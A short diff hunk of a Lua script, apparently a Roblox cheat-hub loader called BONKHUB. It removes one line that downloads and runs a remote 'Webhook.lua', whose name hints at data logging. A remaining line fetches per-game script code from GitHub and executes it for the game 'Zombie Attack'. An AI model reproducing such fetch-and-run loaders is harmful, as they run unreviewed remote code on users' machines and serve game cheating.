@@ -75,8 +75,6 @@ StarterGui:SetCore("SendNotification", {
 })
 
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Toon555wow/BONKHUB/refs/heads/main/Files/Webhook.lua"))()
-
 print("loading")
 if B_426 == 1240123653 or string.find(B_425,"Zombie Attack") then -- Zombie Attack
     B_427(B_107:HttpGet("https://raw.githubusercontent.com/"..B_428.."/BONKHUB/main/"..B_430.."/ZombieAttack"..B_431))()
